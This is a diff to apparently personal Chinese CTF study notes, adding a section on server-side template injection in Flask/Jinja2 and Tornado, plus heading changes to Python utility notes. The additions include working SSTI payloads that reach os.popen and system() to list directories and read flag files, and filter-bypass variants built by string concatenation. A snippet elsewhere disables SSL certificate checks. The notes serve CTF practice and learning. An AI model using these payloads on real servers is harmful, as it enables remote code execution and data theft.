@@ -22,11 +22,39 @@ python3 flask_session_cookie_manager3.py encode -s 'LitCTF' -t '{"name":"admin"}
 
 ## 模版注入
 
+### 寻找可用类脚本
+
+```nginx
+text = "所有子类字符串"
+
+# 去除方括号
+text = text.strip("[").strip("]")
+
+items = text.split(", ")
+# print(items[1])
+
+# 同时查找多个字符串出现的位置
+target_strings = [
+    "<class 'subprocess.Popen'>", 
+    "<class 'warnings.catch_warnings'>", 
+    "<class 'os._wrap_close'>"
+]
+
+for target_string in target_strings:
+    try:
+        index = items.index(target_string)
+        print(f"The '{target_string}' 位置在  {index}.")
+    except ValueError:
+        print(f"The '{target_string}' is not found in the list.")
+```
+
 **==详细==**：https://xz.aliyun.com/t/9584#toc-32
 
 ### 0、基础知识
 
 > ==flash模板注入可利用的Python模块==
+>
+> ==核心：文件读写、命令执行，这两个主要关注：`file`类和`os`类==
 
 1.   **subprocess.Popen**
 2.   **os.wrap_close**
@@ -79,6 +107,293 @@ python3 flask_session_cookie_manager3.py encode -s 'LitCTF' -t '{"name":"admin"}
 {{system('cat /flag')}}
 
 ```
+
+### flask
+
+#### **无过滤情况**
+
+```nginx
+{{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__
+      ['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
+```
+
+#### 过滤掉`__`
+
+- **可用使用request对象绕过**
+
+```nginx
+
+```
+
+#### 过滤了request和class
+
+可以拿这个题目练习：[[NCTF2018]flask真香](https://www.nssctf.cn/problem/966)
+
+**存在的过滤大概有**
+
+```nginx
+config
+class
+mro
+args
+request
+open
+eval
+builtins
+import
+```
+
+
+
+- **可以使用session对象绕过**
+
+- **特性**
+  
+  - > **session一定是一个dict对象，然后可以通过键 ( 也就是数组) 的方式访问类**
+    >
+    > 
+    >
+    > **数组中的键是一个特殊的字符串，他可以通过拼接形成**
+  
+  - ```nginx
+    # 可用进行测试
+    {{session['__cla'+'ss__']}}
+    
+    # 执行成功会返回
+    <class 'flask.sessions.NullSession'>
+    ```
+  
+- **进一步利用**
+
+  - **通过`__bases__`来获取基类元组，索引`0`表示引用基类，一直一直向上就可以访问到`object`类**
+
+  - **`config`也是可以通过这种方法来逃逸的**
+
+  - ==其中写那么多`__bases__[0]`都是为拿到`object`，写多少个取决于环境，这里是写四个到达`object`==
+
+    ```nginx
+    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]}}
+    
+    # 返回结果
+    <class 'object'>
+    ```
+
+- **访问子类**
+
+  - > **通过实例化`__subclasses__`方法去访问所有的子类，同样可以使用字符串拼接**
+
+  - ```nginx
+    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()}}
+    
+    # 结果会返回所有的子类
+    然后通过寻找可用子类下标的脚本找到想要调用的模块下标位置
+    ```
+
+  - ```nginx
+    # 假设<class 'os._wrap_close'>' 位置在  72，通过下面命令去加载他
+    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[72]}}
+    
+    # 下标正确会返回
+    <class 'os._wrap_close'>
+    ```
+
+  - > **然后通过`__init__`实例化它，在通过`__globals__`去查看他的全局变量**
+
+  - ```nginx
+    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[72].__init__.__globals__}}
+    
+    # 结果会返回一大片
+    ```
+
+  - > **如果需要执行命令就看有没有`popen`**
+
+  - ```nginx
+    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[72].__init__.__globals__['po'+'pen']}}
+    
+    # 结果
+    <function popen at 0x7fe3a5e1ee18>
+    ```
+
+  - > **然后调用其中的`read`方法执行命令**
+
+  - ```nginx
+    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[72].__init__.__globals__['po'+'pen']('ls /').read()}}
+    
+    {{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[72].__init__.__globals__['po'+'pen']('cat /Th1s_is__F1114g ').read()}}
+    ```
+
+
+##### 增加过滤
+
+练手题目：[[NCTF 2018]Flask PLUS](https://www.nssctf.cn/problem/965)
+
+```nginx
+__init__
+file
+__dict__
+__builtins__
+__import__
+getattr
+os
+```
+
+> - **使用`__enter__`方法代替`__init__`方法，因为`__enter__`有`__globals__`可用**
+> - 结论：`__enter__ == __init__`
+
+**构造payload**
+
+```nginx
+{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[137].__enter__.__globals__['po'+'pen']('ls /').read()}}
+
+# 或者
+{{()['__cla''ss__'].__bases__[0]['__subcl''asses__']()[218].__enter__.__globals__['__bui''ltins__']['ev''al']("__im""port__('o''s').po""pen('ls').read()")}}
+
+```
+
+​	
+
+#### 无回显SSTI
+
+**通过`popen`和`curl`命令外带获得flag**,[详细看](https://xz.aliyun.com/t/9584#toc-35)
+
+
+
+
+
+### tornado
+
+#### 介绍
+
+> **Tornado 模板实在过于开放，和 mako 差不多。所以 SSTI 手法基本上兼容 jinja2、mako 的 SSTI 手法，思路非常灵活**[详细看](https://www.tr0y.wang/2022/08/05/SecMap-SSTI-tornado/)
+
+
+
+[护网杯]easy_tornado
+
+#### 使用案例
+
+```nginx
+import tornado.ioloop, tornado.web
+
+# 继承 tornado.web.RequestHandler 之后就可以定制不同请求方式要执行的函数
+class IndexHandler(tornado.web.RequestHandler):
+		# 处理 GET 请求
+    def get(self):
+				# 获取了名为 'a' 的请求参数
+        print(self.get_argument('a'))
+
+				# 路径对应的 endpoint 不需要 return，
+				# 直接用 self.write、self.render_string、self.render 等等就可以返回响应内容
+        self.write("get!")
+
+
+# 通过实例化 tornado.web.Application 类创建一个应用程序对象 app
+app = tornado.web.Application(
+# 对于根路径（'/'）的请求使用 IndexHandler处理
+    [('/', IndexHandler)],
+)
+app.listen(8888)
+# 开始监听并处理客户端请求 
+tornado.ioloop.IOLoop.current().start()
+```
+
+**模板语法测试代码**
+
+```nginx
+import tornado.ioloop
+import tornado.web
+import tornado.template as template
+
+# 创建一个自定义的 RequestHandler 类
+class MainHandler(tornado.web.RequestHandler):
+    def get(self):
+				# 获取name参数的值，并设置默认值
+        name = self.get_query_argument('name', 'John Doe')
+        print(name)
+        self.write(template.Template(name).generate(name=name))
+
+
+# 创建一个 Tornado 应用
+def make_app():
+    return tornado.web.Application([
+        (r"/", MainHandler),
+    ])
+
+# 启动 Tornado 服务器
+if __name__ == "__main__":
+    app = make_app()
+    app.listen(8888)
+    tornado.ioloop.IOLoop.current().start()
+```
+
+- **这就是最简单的一个实验脚本了**
+
+#### 语法
+
+> - `{{ ... }}`：里面直接写 python 语句即可，没有经过特殊的转换。默认输出会经过 html 编码
+> - `{% ... %}`：内置的特殊语法，有以下几种规则
+>   - `{# ... #}`：注释，到达后端接收到值为：`{`
+>   - `{% comment ... %}`：也是注释，效果和上面的一样
+>   - `{% from *x* import *y* %}`：等价与 python 原始的 `import`
+>   - `{% include *filename* %}`：与手动合并模板文件到 `include` 位置的效果一样
+>   - `{% autoescape *function* %}`：用于设置当前模板文件的编码方式
+>   - `{% for *var* in *expr* %}...{% end %}`：等价与 python 的 for 循环
+>   - `{% apply *function* %}...{% end %}`：用于执行函数，`function` 是函数名。`apply` 到 `end` 之间的内容是函数的参数
+>   - 
+>   - `{% block *name* %}...{% end %}`：引用定义过的模板段，通常配合 `extends` 使用
+>     - 比如 `{% block name %}a{% end %}{% block name %}b{% end %}` 的结果是 `bb`...
+>   - `{% extends *filename* %}`：将模板文件引入当前的模板，配合 `block` 食用
+>   - 
+>   - 
+
+
+
+**==特殊的全局变量或者函数==**
+
+> - `escape`：就是 `xhtml_escape`
+> - `datetime`：就是 python 标准库里的 datetime
+> - `_tt_utf8`：就是 `utf8`
+> - `__loader__`，这个东西下面有个 `get_source`，它的作用是获取当前模板翻译后的代码
+
+####  攻击思路
+
+> Tornado 你可以理解为是 Flask + jinja2，所以 Tornado 的模板 `tornado.template` 其实也可以用在 Flask 里
+
+然后就有：tornado.template` 再写 `tornado.template` + `tornado.web.Application
+
+#### tornado.template 的 SSTI
+
+==常规手法==
+
+- **可以直接执行代码的方式**
+  - `{{ __import__("os").system("whoami") }}`
+  - `{% apply __import__("os").system %}id{% end %}`
+  - `{% raw __import__("os").system("whoami") %}`
+
+
+
+==临时代码的变量覆盖==
+
+- Tornad生成模版的过程
+  - 在 `site-packages/tornado/template.py` 的 `class Template` 下，
+  - `__init__` 负责读取模板，然后调用 `_generate_python` 将模板内容转为Python代码，
+  - 转换过程会用到 `_CodeWriter`，它负责把生成的 Python 代码写入 `String.IO` 实例中。
+  - 拿到临时代码之后，将生成的 Python 代码编译为字节码。
+  - 在执行 `generate` 的时候，会将临时代码用 `exec` 执行。
+
+
+
+### Mako
+
+
+
+### Jinja2
+
+
+
+### Twig
+
+
 
 
 
@@ -311,7 +626,9 @@ print('The age is:' + str(P.age), 'The name is:' + P.name)
 
 
 
-## BeautifulSoup库使用
+## python运用
+
+### BeautifulSoup库使用
 
 >   BeautifulSoup库是Python中一个非常流行的HTML和XML解析库。
 >
@@ -375,7 +692,7 @@ Occupation: Web Developer
 
 
 
-## 证书验证解决
+### 证书验证解决
 
 **（同时适用urlopen和urlretrieve函数）：**
 
@@ -392,7 +709,7 @@ context = ssl._create_unverified_context()
 response = urlopen(json_url, context=context)
 ```
 
-## 获取验证码
+### 获取验证码
 
 ```python
 import ddddocr
@@ -405,7 +722,7 @@ res = ocr.classification(img_bytes)
 print(res)
 ```
 
-## 会话维持
+### 会话维持
 
 ```python
 s=requests.Session()
@@ -415,7 +732,7 @@ print(r.text)
 
 ```
 
-## 写入文件
+### 写入文件
 
 **多行写入（如html）**
 
